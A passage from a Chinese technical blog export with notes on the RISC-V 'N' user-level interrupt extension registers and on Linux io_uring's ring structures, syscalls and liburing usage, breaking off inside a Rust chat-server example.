  </entry>
  <entry>
    <title>RISC -V N扩展</title>
    <url>/2021/11/14/RISC-V-N%E6%89%A9%E5%B1%95/</url>
    <content><![CDATA[<h2 id="增加的-csrs"><a class="markdownIt-Anchor" href="#增加的-csrs"></a> 增加的 CSRs</h2>
<h3 id="用户状态寄存器ustatus"><a class="markdownIt-Anchor" href="#用户状态寄存器ustatus"></a> 用户状态寄存器(ustatus)</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UXLEN-1 5   4    3  1    0</span><br><span class="line">┌────────┬──────┬──────┬─────┐</span><br><span class="line">│  WPRI  │ UPIE │ WPRI │ UIE │</span><br><span class="line">└────────┴──────┴──────┴─────┘</span><br><span class="line">  UXLEN-5   1       3     1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>ustatus</code> 是一个 UXLEN 位长的可读写寄存器，记录和控制硬件线程当前的工作状态。</p>
<p>用户态中断使能位 UIE 为零时，用户态中断被禁用。为了向用户态陷入处理程序提供原子性，UIE 中的值在用户态中断发生时被复制到 UPIE ，且 UIE 被置为零。</p>
<p>UIE 和 UPIE 是 <code>mstatus</code> 和 <code>sstatus</code> 中对应位的镜像。</p>
<blockquote>
<p>进入用户态中断处理函数之前的特权级只可能是用户态，所以不需要 UPP 位。</p>
</blockquote>
<p>指令 URET 用于从用户态陷入状态中返回。URET 将 UPIE 复制回 UIE，然后将 UPIE 置位，最后将 <code>uepc</code> 拷贝至 <code>pc</code>。</p>
<blockquote>
<p>在 UPIE/UIE 栈弹出后置位 UPIE 是为了启用中断，以及帮助发现代码中的错误。</p>
</blockquote>
<h3 id="用户陷入向量基址寄存器utvec"><a class="markdownIt-Anchor" href="#用户陷入向量基址寄存器utvec"></a> 用户陷入向量基址寄存器(utvec)</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| BASE[UXLEN-1 : 2] | MODE |</span><br></pre></td></tr></table></figure>
<p><code>utvec</code> 是 UXLEN 位长的可读写寄存器，存储陷入向量的设置，包括向量基址 (BASE) 和向量模式。</p>
<p><code>utvec</code> 中的 BASE 为 <strong>WARL</strong> 字段，可以存储任何有效的虚拟地址或物理地址，地址需要对齐到 4 字节。其他的向量模式可能有额外的对齐约束条件。</p>
<table>
<thead>
<tr>
<th>value</th>
<th>name</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>direct</td>
<td>base</td>
</tr>
<tr>
<td>1</td>
<td>vectored</td>
<td>base + 4 * cause</td>
</tr>
<tr>
<td></td>
<td></td>
<td>reserved</td>
</tr>
</tbody>
</table>
<h3 id="用户中断寄存器-uip-与-uie"><a class="markdownIt-Anchor" href="#用户中断寄存器-uip-与-uie"></a> 用户中断寄存器 (<code>uip</code> 与 <code>uie</code>)</h3>
<p><code>uip</code> 和 <code>uie</code> 均为 UXLEN 位的可读写寄存器，其中 <code>uip</code> 存储等待处理的中断信息， <code>uie</code> 存储相应的中断使能位。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UXLEN-1  9    8   7    5    4   3    1    0</span><br><span class="line">| WPRI    | UEIP | WPRI | UTIP | WPRI | USIP |</span><br><span class="line"></span><br><span class="line">| WPRI    | UEIE | WPRI | UTIE | WPRI | USIE |</span><br><span class="line">  UXLEN-9     1      3      1      3      1</span><br></pre></td></tr></table></figure>
<p>定义三种中断：软件中断、时钟中断和外部中断。用户态软件中断通过置位当前硬件线程的 <code>uip</code> 的软件中断等待位 (USIP) 来触发。清零该位可以清除待处理的软件中断。当 <code>uie</code> 中的 USIE 为零时，用户态软件中断被禁用。</p>
<p>ABI 应当提供一种向其他硬件线程发送跨核中断的机制，这最终将置位接收方硬件线程 <code>uip</code> 寄存器的 USIP 位。</p>
<p>除了 USIP， <code>uip</code> 中的其他位在用户态是只读的。</p>
<p>如果 <code>uip</code> 寄存器中的 UTIP 位被置位，将产生一个待处理的用户态时钟中断。当 <code>uie</code> 寄存器中的 UTIE 位被置零时，用户态时钟中断被禁用。ABI 应该提供清除待处理的时钟中断的机制。</p>
<p>如果 <code>uip</code> 寄存器中的 UEIP 位被置位，将产生一个待处理的用户态外部中断。当 <code>uie</code> 寄存器中的 UEIE 位被置位时，用户态外部中断被禁用。ABI 应该提供屏蔽、解除屏蔽和查询外部中断原因的机制。</p>
<p><code>uip</code> 和 <code>uie</code> 寄存器是 <code>mip</code> 和 <code>mie</code> 寄存器的子集。对 <code>uip</code>/<code>uie</code> 任何字段的读取或写入操作，都会等效为对 <code>mip</code>/<code>mie</code> 的相应字段的读取或写入。如果系统实现了 S 模式，<code>uip</code> 和 <code>uie</code> 寄存器也是 <code>sip</code> 和 <code>sie</code> 寄存器的子集。</p>
<h3 id="内核态陷入委托寄存器-sedeleg-与-sideleg"><a class="markdownIt-Anchor" href="#内核态陷入委托寄存器-sedeleg-与-sideleg"></a> 内核态陷入委托寄存器 (<code>sedeleg</code> 与 <code>sideleg</code>)</h3>
<p>为提升中断和异常的处理性能，可以实现独立的可读写寄存器 <code>sedeleg</code> 和 <code>sideleg</code>，设置其中的位将特定的中断和异常交由用户态陷入处理程序处理。这两个寄存器与相应的机器态陷入委托寄存器 (<code>medeleg</code> 和 <code>mideleg</code>) 布局相同。只有已经被委托给 S 态的陷入对应的位才是可写的，其余位由硬件保持为 0 ，即只有委托给 S 态的陷入才可能被委托给 U 态。</p>
<p>当一个陷入被委托给一个权限较低的模式 u 时，<code>ucause</code> 寄存器被写入陷阱的原因；<code>uepc</code> 寄存器被写入发生陷阱的指令的虚拟地址；<code>utval</code> 寄存器被写入一个特定的异常数据；<code>mstatus</code> 的 UPIE 字段被写入陷阱发生时 UIE 字段的值；<code>mstatus</code> 的 UIE 字段被清零。<code>mcause</code>/<code>scause</code> 和 <code>mepc</code>/<code>sepc</code> 寄存器以及 <code>mstatus</code> 的 MPP 和 MPIE 字段不被写入。</p>
<p>一个实现不应硬性规定任何委托位为一，也就是说，任何可以被委托的陷阱都必须支持不被委托。一个实现方案是选择可委托的陷入的子集。支持的可委托位可通过向每个比特位置写 1，然后读回 <code>medeleg</code>/<code>sedeleg</code> 或 <code>mideleg</code>/<code>sideleg</code> 中的值，看看哪些位上有 1。</p>
<blockquote>
<p>目前，不支持触发低权限级的陷入</p>
</blockquote>
<p>不会在用户态发生的应硬件恒零，如 ECall from S/H/M-mode</p>
<h3 id="uscratch"><a class="markdownIt-Anchor" href="#uscratch"></a> uscratch</h3>
<p><code>uscratch</code> 寄存器是一个 UXLEN 位读/写寄存器。</p>
<h3 id="用户异常程序计数器-uepc"><a class="markdownIt-Anchor" href="#用户异常程序计数器-uepc"></a> 用户异常程序计数器 (<code>uepc</code>)</h3>
<p><code>uepc</code> 是 UXLEN 位的可读写寄存器。最低位（<code>uepc[0]</code>）恒为次uepc` 视实现的对齐需求而定。</p>
<p><code>uepc</code> 是 WARL 寄存器，必须能存储所有有效的虚拟地址，但不需要能够存储所有可能的无效地址。实现可以先将一些非法地址转为其他非法地址再写入 <code>uepc</code>。</p>
<p>当陷入在用户态处理时，被中断或触发异常的指令的虚拟地址被写入 <code>uepc</code>，除此之外 <code>uepc</code> 永远不会被硬件实现写入，但可能被软件显式写入。</p>
<h3 id="用户陷入原因寄存器-ucause"><a class="markdownIt-Anchor" href="#用户陷入原因寄存器-ucause"></a> 用户陷入原因寄存器 (<code>ucause</code>)</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| Interrupt | Exception Code (WLRL) |</span><br></pre></td></tr></table></figure>
<p><code>ucause</code> 是 UXLEN 位长读写寄存器。当陷入在用户态处理时，触发陷入的事件编号被写入 <code>ucause</code>，除此之外 <code>ucause</code> 永远不会被硬件实现写入，但可能被软件显式写入。</p>
<table>
<thead>
<tr>
<th>Interrupt</th>
<th>Exception Code</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>0</td>
<td>用户态软件中断</td>
</tr>
<tr>
<td>1</td>
<td>1-3</td>
<td><em>预留</em></td>
</tr>
<tr>
<td>1</td>
<td>4</td>
<td>用户态时钟中断</td>
</tr>
<tr>
<td>1</td>
<td>5-7</td>
<td><em>预留</em></td>
</tr>
<tr>
<td>1</td>
<td>8</td>
<td>用户态外部中断</td>
</tr>
<tr>
<td>1</td>
<td>9-15</td>
<td><em>预留</em></td>
</tr>
<tr>
<td>1</td>
<td>≥16</td>
<td><em>由平台使用</em></td>
</tr>
<tr>
<td>0</td>
<td>0</td>
<td>指令地址未对齐</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>指令访问错误</td>
</tr>
<tr>
<td>0</td>
<td>2</td>
<td>非法指令</td>
</tr>
<tr>
<td>0</td>
<td>3</td>
<td>断点</td>
</tr>
<tr>
<td>0</td>
<td>4</td>
<td>加载地址未对齐</td>
</tr>
<tr>
<td>0</td>
<td>5</td>
<td>加载访问错误</td>
</tr>
<tr>
<td>0</td>
<td>6</td>
<td>存储/原子内存操作地址未对齐</td>
</tr>
<tr>
<td>0</td>
<td>7</td>
<td>存储/原子内存操作访问错误</td>
</tr>
<tr>
<td>0</td>
<td>8</td>
<td>用户态环境调用</td>
</tr>
<tr>
<td>0</td>
<td>9-11</td>
<td><em>预留</em></td>
</tr>
<tr>
<td>0</td>
<td>12</td>
<td>指令页错误</td>
</tr>
<tr>
<td>0</td>
<td>13</td>
<td>加载页错误</td>
</tr>
<tr>
<td>0</td>
<td>14</td>
<td><em>预留</em></td>
</tr>
<tr>
<td>0</td>
<td>15</td>
<td>存储/原子内存操作页错误</td>
</tr>
<tr>
<td>0</td>
<td>16-23</td>
<td><em>预留</em></td>
</tr>
<tr>
<td>0</td>
<td>24-31</td>
<td><em>自定义用途</em></td>
</tr>
<tr>
<td>0</td>
<td>32-47</td>
<td><em>预留</em></td>
</tr>
<tr>
<td>0</td>
<td>48-63</td>
<td><em>自定义用途</em></td>
</tr>
<tr>
<td>0</td>
<td>≥64</td>
<td><em>预留</em></td>
</tr>
</tbody>
</table>
<h3 id="用户陷入值寄存器-utval"><a class="markdownIt-Anchor" href="#用户陷入值寄存器-utval"></a> 用户陷入值寄存器 (<code>utval</code>)</h3>
<p><code>utval</code> 是 UXLEN 位的可读写寄存器。当陷入在用户态处理时，和特定异常相关的信息将被写入 <code>utval</code> 以帮助软件处理陷入，除此之外 <code>utval</code> 永远不会被硬件实现写入，但可能被软件显式写入。硬件平台指定哪些异常必须将信息写入 <code>utval</code> ，以及哪些异常会无条件写入 0 。</p>
<p>当硬件断点被触发，或是一个指令/加载/存储地址未对齐/访问错误/页错误异常产生时，导致错误的虚拟地址被写入 <code>utval</code> 。当非法指令异常产生时，相应指令的前 XLEN 或 ILEN 位可能被写入 <code>utval</code> 。对于其他异常，<code>utval</code> 被置为 0 ，但未来的标准可能重新定义 <code>utval</code> 的设置。</p>
<h2 id="n-扩展的指令"><a class="markdownIt-Anchor" href="#n-扩展的指令"></a> N 扩展的指令</h2>
<h3 id="uret"><a class="markdownIt-Anchor" href="#uret"></a> URET</h3>
<p><code>uret</code> 将 <code>pc</code> 设置为 <code>uepc</code> ，将 <code>ustatus.UIE</code> 设置为 <code>ustatus.UPIE</code> ，从而恢复中断前的状态。</p>
<h2 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h2>
<p><a href="https://five-embeddev.com/riscv-isa-manual/latest/n.html">“N” Standard Extension for User-Level Interrupts, Version 1.1</a></p>
<p><a href="https://gallium70.github.io/rv-n-ext-impl/ch2_1_n_ext_spec.html">N 扩展规范草案</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>RISC -V</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>io_uring 阅读笔记</title>
    <url>/2021/10/30/io-uring%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="io_uring-简述"><a class="markdownIt-Anchor" href="#io_uring-简述"></a> io_uring 简述</h2>
<p>对于 io_uring 的异步请求有两个重要的操作：提交请求、完成所提交的请求。</p>
<p>对于 IO 事件的提交，应用程序是生产者而内核是消费者；而对于完成事件来说，内核是生产者而应用程序是消费者。因此我们需要一对环(rings) 提供高性能的 channel 用于在内核和应用程序中的通信，这对环就是新的接口的核心: io_uring，它们被命名为 <code>submission queue(SQ)</code>, <code>completion queue(CQ)</code>，这两个数据结构构造了新接口的基础。</p>
<h2 id="io_uring-的数据结构"><a class="markdownIt-Anchor" href="#io_uring-的数据结构"></a> io_uring 的数据结构</h2>
<p>首先我们看一下 <code>(completion queue event)CQE</code> 的数据结构定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span> &#123;</span></span><br><span class="line">    __u64 user_data;</span><br><span class="line">    __s32 res;</span><br><span class="line">    __u32 flags;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先 <code>io_uring_cqe</code> 有一个 <code>user_data</code> 的域，这个域是被最初的提交的请求时就被携带的，能够携带任何用来表明这是哪个请求的信息，最基础的使用就是使用原始请求的指针，内核将不会修改这个域，它仅仅直接从提交事件中转移到完成事件中。<code>res</code> 指向本次提交事件所返回的结果，就像系统调用返回的结果一样。<code>flags</code> 域将携带依赖于该操作的元数据，但是现在这个域还没有被使用。</p>
<p>对于 <code>submission queue event(SQE)</code> 来说结构定义则更为复杂：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> &#123;</span></span><br><span class="line">   __u8 opcode;</span><br><span class="line">   __u8 flags;</span><br><span class="line">   __u16 ioprio;</span><br><span class="line">   __s32 fd;</span><br><span class="line">   __u64 off;</span><br><span class="line">   __u64 addr;</span><br><span class="line">   __u32 len;</span><br><span class="line">   <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">   	<span class="keyword">__kernel_rwf_t</span> rw_flags;</span><br><span class="line">   	__u32 fsync_flags;</span><br><span class="line">   	__u16 poll_events;</span><br><span class="line">	__u32 sync_range_flags;</span><br><span class="line">	__u32 msg_flags;   </span><br><span class="line">   &#125;;</span><br><span class="line">   __u64 user_data;</span><br><span class="line">   <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">   	__u16 buf_index;</span><br><span class="line">   	__u64 __pad2[<span class="number">3</span>];</span><br><span class="line">   &#125;; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>opcode</code> 域用来描述操作码对于提交的请求，例如对于一个读请求来说则是 <code>IORING_OP_READV</code>。<code>flags</code> 包含在命令类型中通用的修饰符标志。<code>ioprio</code> 则用来表示该请求的优先级，对于普通的读写请求来说，将遵循 <code>ioprio_set</code> 系统调用的定义。<code>fd</code> 是与该请求相关的文件描述符，<code>off</code> 表明该操作开始执行的偏移量，<code>addr</code> 包含了内核开始IO操作的地址。对于 <code>non-vectored</code> IO 传输，<code>addr</code> 必须直接包含地址。如果是 <code>non-vectored</code> IO 的话直接携带 <code>len</code>, 如果是 <code>vectored</code> IO 的话则携带 a number of vector（被 <code>addr</code> 所描述）。</p>
<p>接下来是一个 union 用来描述特定的 <code>opcode</code> 的。举例来说，对于 vectored read (<strong>IORING_OP_READV</strong>)，这些标志位这些标志位应当和 <code>preadv2(2)</code> 系统调用的标志位相同。 <code>user_data</code> 是由用户传输进来且不会被内核访问与修改。<code>buf_index</code> 将在高级使用用例中进行描述，最后的 <code>pad</code> 用来做数据结构的填充，是被用于作为64位对齐使用。</p>
<p>（注：<code>vectored IO</code> 是一种 IO的形式 通过一个单生产者顺序地从多个 buffer 中读取数据并写入到一个数据流中；或者从一个 buffer 中读取数据并写入到多个数据流中，其用于在一次函数调用中读、写多个非连续缓冲区。）</p>
<h2 id="io_uring-通信"><a class="markdownIt-Anchor" href="#io_uring-通信"></a> io_uring 通信</h2>
<p>在明白了 io_uring 的数据结构后，让我们看看 io_uring 工作的细节。</p>
<p><code>CQEs</code> 被一个数组来组织，该数组的内存对于内核和应用程序来说都是可见的并且是可修改的。但是，由于 <code>CQE</code> 是由内核生成的，因此实际上只有内核在修改 <code>CQE</code>。通信的方法使用一个 ring buffer 来管理。每当内核将新事件发布到 <code>CQ ring</code> 时，它都会更新与其关联的 tail。当应用程序使用一个 entry 时，它会更新 head。因此，如果 tail 与 head 不同，则应用程序知道它有一个或多个可供消费的事件。环形计数器本身是自由流动的 32 位整数，当完成的事件数量超过环的容量时，依靠自然包装。这种方法的一个优点是我们可以利用环的全尺寸，而不必在侧面管理“环已满”标志，这会使环的管理变得复杂。随之而来的是，环的大小必须是 2 的幂。</p>
<p>为了找到一个事件的索引，应用程序必须给当前的  tail 索引加上一个掩码，如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">unsigned</span> head;</span><br><span class="line">  head = cqring→head;</span><br><span class="line">read_barrier();</span><br><span class="line">  <span class="keyword">if</span> (head != cqring→tail) &#123;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span> *<span class="title">cqe</span>;</span></span><br><span class="line">     <span class="keyword">unsigned</span> index;</span><br><span class="line">    index = head &amp; (cqring→mask);</span><br><span class="line">    cqe = &amp;cqring→cqes[index];</span><br><span class="line">    <span class="comment">/* process completed cqe here */</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* we&#x27;ve now consumed this entry */</span></span><br><span class="line">     head++;</span><br><span class="line">  &#125;</span><br><span class="line">cqring→head = head;</span><br><span class="line">  write_barrier();</span><br></pre></td></tr></table></figure>
<p><code>ring-&gt;cqes[]</code> 是 <code>io_uring_cqe</code> 结构的共享数组。在之后，我们将会介绍共享内存是如何进行启动和管理的。</p>
<p>对于提交事件这一端规则仍然被保留。应用程序更新 tail 同时内核消费 head，一个重要的不同点是 CQ ring 直接索引 <code>CQEs</code> 的共享内存，提交端在它们中有一个 indirection 的 array，因此提交端的 <code>ring buffer</code> 是通过 index 直接访问 array。</p>
<p>一个例子如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> tail, index;</span><br><span class="line">tail = sqring→tail;</span><br><span class="line">index = tail &amp; (*sqring→ring_mask);</span><br><span class="line">sqe = &amp;sqring→sqes[index];</span><br><span class="line"><span class="comment">/* this call fills in the sqe entries for this IO */</span></span><br><span class="line">init_io(sqe);</span><br><span class="line"><span class="comment">/* fill the sqe index into the SQ ring array */</span></span><br><span class="line">sqring→<span class="built_in">array</span>[index] = index;</span><br><span class="line">tail++;</span><br><span class="line">write_barrier();</span><br><span class="line">sqring→tail = tail;</span><br><span class="line">write_barrier();</span><br></pre></td></tr></table></figure>
<p>完成事件可能以任何顺序达到，请求的顺序和完成的顺序没有任何联系，SQ ring 和 CQ ring 独立地运行。然而，一个完成的事件将总是与一个请求的事件相适配。因此，一个完成的事件将总和一个特定的提交请求相联系。</p>
<h2 id="io_uring-接口"><a class="markdownIt-Anchor" href="#io_uring-接口"></a> io_uring 接口</h2>
<p>和 <code>aio</code> 一样，<code>io_uring</code> 也有许多系统调用，第一个系统调用用来启动 <code>io_uring</code> 实例：</p>
<p><code>int io_uring_setup(unsigned entries, struct io_uring_params *params);</code></p>
<p>应用程序必须提供 <code>io_uring</code> 实例所规定的数量的 entries。其中 <code>entries</code> 表明 <code>SQEs</code> 的数量，必须是2的幂次，在1…4096中，<code>params</code> 结构体的定义如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> &#123;</span></span><br><span class="line">    __u32 sq_entries;</span><br><span class="line">    __u32 cq_entries;</span><br><span class="line">    __u32 flags;</span><br><span class="line">    __u32 sq_thread_cpu;</span><br><span class="line">    __u32 sq_thread_idle;</span><br><span class="line">    __u32 resv[<span class="number">5</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_sqring_offsets</span> <span class="title">sq_off</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_cqring_offsets</span> <span class="title">cq_off</span>;</span> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>sq_entries</code> 将由内核进行填充，让应用程序知道当前的 ring 支持多少个 <code>SQE</code> entries。同样对于 <code>cqe_entries</code> 通知应用程序 CQ ring 到底有多大。</p>
<p>当成功调用该接口后，内核将会返回一个文件描述符指向这个 <code>io_uring</code> 实例。这就是 <code>sq_off</code> 和 <code>cq_off</code> 派上用场的地方。由于 SQE 和 CQE 需要被内核和用户同时访问，因此应用程序必须知道如果到达这块内存，这应当使用 <code>mmap()</code> 映射到应用程序的内存空间中。应用程序使用 <code>sq_off</code> 去指明不同 ring 成员的偏移量，<code>io_sqring_offsets</code> 结构如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_sqring_offsets</span> &#123;</span></span><br><span class="line">    __u32 head; <span class="comment">/* offset of ring head */</span></span><br><span class="line">    __u32 tail; <span class="comment">/* offset of ring tail */</span></span><br><span class="line">    __u32 ring_mask; <span class="comment">/* ring mask value */</span></span><br><span class="line">    __u32 ring_entries; <span class="comment">/* entries in ring */</span></span><br><span class="line">    __u32 flags; <span class="comment">/* ring flags */</span></span><br><span class="line">    __u32 dropped; <span class="comment">/* number of sqes not submitted */</span></span><br><span class="line">    __u32 <span class="built_in">array</span>; <span class="comment">/* sqe index array /</span></span><br><span class="line"><span class="comment">	__u32 resv1;</span></span><br><span class="line"><span class="comment">	__u64 resv2;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br></pre></td></tr></table></figure>
<p>为了获取这段内存，应用程序必须使用 <code>mmap</code> 通过 <code>io_uring</code> 的文件描述符和与 SQ ring 相关联的内存偏移量，<code>io_uring</code> 的 API 定义了如下的 <code>mmap</code> 偏移量从而能被应用程序所使用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORING_OFF_SQ_RING 0ULL </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORING_OFF_CQ_RING 0x8000000ULL </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORING_OFF_SQES 0x10000000ULL</span></span><br></pre></td></tr></table></figure>
<p><code>IORING_OFF_SQ_RING</code> 用来映射 SQ ring 进入用户内存空间，<code>IORING_OFF_CQ_RING</code> 用于 CQ ring，<code>IORING_OFF_SQES</code> 用来映射 sqe 数组，对于 CQEs 的数组来说，其数组是其 ring 的一部分。由于 SQ ring 是 SQE 的数组的索引，因此应用程序必须单独映射 SQE 数组。</p>
<p>应用程序将需要自己定义数据结构获取这些偏移量，一个可能的例子如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">app_sq_ring</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> *head;</span><br><span class="line">    <span class="keyword">unsigned</span> *tail;</span><br><span class="line">	<span class="keyword">unsigned</span> *ring_mask;</span><br><span class="line">    <span class="keyword">unsigned</span> *ring_entries;</span><br><span class="line">	<span class="keyword">unsigned</span> *flags;</span><br><span class="line">   	<span class="keyword">unsigned</span> *dropped;</span><br><span class="line">	<span class="keyword">unsigned</span> *<span class="built_in">array</span>; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>一个启动 <code>io_uring</code> 的例子如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">struct app_sq_ring <span class="title">app_setup_sq_ring</span><span class="params">(<span class="keyword">int</span> ring_fd, struct io_uring_params *p)</span> </span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">app_sq_ring</span> <span class="title">sqring</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *ptr;</span><br><span class="line">    ptr = mmap(<span class="literal">NULL</span>, p→sq_off.<span class="built_in">array</span> + p→sq_entries * <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,</span><br><span class="line">    ring_fd, IORING_OFF_SQ_RING);</span><br><span class="line">    sring→head = ptr + p→sq_off.head;</span><br><span class="line">    sring→tail = ptr + p→sq_off.tail;</span><br><span class="line">    sring→ring_mask = ptr + p→sq_off.ring_mask;</span><br><span class="line">    sring→ring_entries = ptr + p→sq_off.ring_entries;</span><br><span class="line">    sring→flags = ptr + p→sq_off.flags;</span><br><span class="line">    sring→dropped = ptr + p→sq_off.dropped;</span><br><span class="line">    sring→<span class="built_in">array</span> = ptr + p→sq_off.<span class="built_in">array</span>;</span><br><span class="line">    <span class="keyword">return</span> sring; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>应用程序也需要一个方式通知内核现在有哪些请求需要被消费，这将会通过如下系统调用来实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">io_uring_enter</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">int</span> to_submit, <span class="keyword">unsigned</span> <span class="keyword">int</span> min_complete, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">sigset_t</span> sig)</span></span>;</span><br></pre></td></tr></table></figure>
<p><code>fd</code> 指向 <code>io_uring</code> 文件描述符，<code>to_submit</code> 通知内核有多少 sqes 需要被消费和提交， <code>min_complete</code> 通知内核等待完成该数量的请求</p>
<h2 id="内存序列"><a class="markdownIt-Anchor" href="#内存序列"></a> 内存序列</h2>
<p>待更新…</p>
<h2 id="liburing-库"><a class="markdownIt-Anchor" href="#liburing-库"></a> liburing 库</h2>
<p>直接使用系统调用对于用户来说不算友好，因此内核开发者为用户提供了一个 <code>io_uring</code> 的用户库。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span>;</span></span><br><span class="line">io_uring_queue_init(ENTRIES, &amp;ring, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>通过使用 <code>io_uring_queue_init</code> 我们可以启动一个 io_uring 实例而无需使用 <code>io_uring_setup</code> 之后调用 <code>mmap()</code>,</p>
<p>当完成该实例的使用后我们可以调用下面的系统调用来销毁：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">io_uring_queue_exit(&amp;ring);</span><br></pre></td></tr></table></figure>
<p>一个使用 <code>liburing</code> 实例如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> <span class="title">sqe</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span> <span class="title">cqe</span>;</span></span><br><span class="line">   <span class="comment">/* get an sqe and fill in a READV operation */</span></span><br><span class="line">	sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">	io_uring_prep_readv(sqe, fd, &amp;iovec, <span class="number">1</span>, offset);</span><br><span class="line">   <span class="comment">/* tell the kernel we have an sqe ready for consumption */</span></span><br><span class="line">	io_uring_submit(&amp;ring);</span><br><span class="line">   <span class="comment">/* wait for the sqe to complete */</span></span><br><span class="line">	io_uring_wait_cqe(&amp;ring, &amp;cqe);</span><br><span class="line">  <span class="comment">/* read and process cqe event */</span></span><br><span class="line">	app_handle_cqe(cqe);</span><br><span class="line">	io_uring_cqe_seen(&amp;ring, cqe);</span><br></pre></td></tr></table></figure>
<h2 id="高级用法及特性"><a class="markdownIt-Anchor" href="#高级用法及特性"></a> 高级用法及特性</h2>
<p>待更新…</p>
<h2 id="更多实例"><a class="markdownIt-Anchor" href="#更多实例"></a> 更多实例</h2>
<p>一个使用 <code>io_uring</code> 编写的 chat server 如下所示：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> io_uring::&#123;IoUring, SubmissionQueue, opcode, squeue, types&#125;;</span><br><span class="line"><span class="keyword">use</span> slab::Slab;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> std::collections::VecDeque;</span><br><span class="line"><span class="keyword">use</span> std::net::TcpListener;</span><br><span class="line"><span class="keyword">use</span> std::os::unix::io::&#123; AsRawFd, RawFd &#125;;</span><br><span class="line"><span class="keyword">use</span> std::&#123; io, ptr &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Clone, Debug)]</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Token</span></span> &#123;</span><br><span class="line">    Accept, </span><br><span class="line">    Poll &#123;</span><br><span class="line">        fd: RawFd</span><br><span class="line">    &#125;,</span><br><span class="line">    Read &#123;</span><br><span class="line">        fd: RawFd,</span><br><span class="line">        buf_index: <span class="built_in">usize</span></span><br><span class="line">    &#125;,</span><br><span class="line">    Write &#123;</span><br><span class="line">        fd: RawFd, </span><br><span class="line">        buf_index: <span class="built_in">usize</span>, </span><br><span class="line">        offset: <span class="built_in">usize</span>,</span><br><span class="line">        len: <span class="built_in">usize</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="class"><span class="keyword">struct</span> <span class="title">AcceptCount</span></span> &#123;</span><br><span class="line">    entry: squeue::Entry,</span><br><span class="line">    count: <span class="built_in">usize</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> AcceptCount &#123;</span><br><span class="line">    <span class="comment">/// 新建 AcceptCount 